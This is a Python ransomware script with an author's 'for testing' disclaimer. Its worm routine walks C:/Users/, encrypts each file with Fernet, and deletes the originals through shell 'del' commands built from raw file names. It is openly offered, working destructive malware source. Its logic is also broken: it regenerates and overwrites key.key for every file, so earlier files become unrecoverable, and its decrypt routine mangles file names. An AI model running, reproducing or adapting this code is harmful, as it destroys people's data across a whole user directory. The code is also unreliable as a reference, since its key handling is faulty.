from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import base64
import time
import subprocess

class Ransomware:
    def __init__(self):
        print("""
**************************************************************************************
*[+]DISCLAIMER:                                                                      *
*    [!]THIS TOOL IS FOR TESTING.!                                                   *
*    [!]THIS TOOL MUST NOT BE USED OUT OF ITS INTENDED PURPOSE!                      *
*    [!]THIS TOOL CAN BE USED IN VIRTUAL MACHINE FOR TESTING!                        *
*    [!]ILLEGAL USAGE IS CYBER CRIME DON'T CHANGE THE CODE FOR YOUR SELF INTEREST!   *
*         ************************************************************               *
*         *     GITHUB:https://www.github.com/AzizKpln               *               *
*         *     FACEBOOK:https://www.facebook.com/aziz.kaplan.96387  *               *
*         *     YOUTUBE:https://www.youtube.com/channel/             *               *
*         *     INSTAGRAM:https://www.instagram.com/aziz.kpln        *               *
**************************************************************************************    
""")
        
    def generate_key(self):
        key=Fernet.generate_key()
        file=open('key.key',"wb")
        file.write(key)
        file.close()
    def worm(self):
        filename=os.path.basename(__file__)
        for path,folder,file in os.walk("C:/Users/"):
            for encrypt_files in file:
                if encrypt_files.endswith(".key") or filename in encrypt_files:
                    pass
                else:
                    try:
                        os.chdir(path)
                        self.generate_key()
                        file=open("key.key","rb")
                        key=file.read()
                        file.close()
                        with open(encrypt_files,"rb") as encrypto:
                            data=encrypto.read()
                        fernet=Fernet(key)
                        encrypted=fernet.encrypt(data)
                        with open(encrypt_files+".encrypted","wb") as encrypto:
                            encrypto.write(encrypted)
                        spl=encrypt_files.split(".")
                        os.system("""del "%s " """%str(encrypt_files))
                        print('[+]Encrypted: "'+str(encrypt_files)+'"')
                       
                    except:
                        pass
    def decrypted(self):
        filename=os.path.basename(__file__)
        for path,folder,file in os.walk("C:/Users/"):
            for encrypt_files in file:
                if encrypt_files.endswith(".key") or filename in encrypt_files:
                    pass
                else:
                    try:
                        os.chdir(path)
                        file=open("key.key","rb")
                        key=file.read()
                        file.close()
                        with open(encrypt_files,"rb") as encrypto:
                            data=encrypto.read()
                        fernet=Fernet(key)
                        encrypted=fernet.decrypt(data)
                        with open(str(encrypt_files[:-10]),"wb") as encrypto:
                            encrypto.write(encrypted)
                       
                        os.system("""del "%s"  """%str(encrypt_files))
                        print("[+]Decrypted:"+str(encrypt_files))
                       
                    except:
                       pass
    def run(self):
        self.generate_key()
        self.worm()

ransomware=Ransomware()
time.sleep(10)
ransomware.decrypted()

                        
                
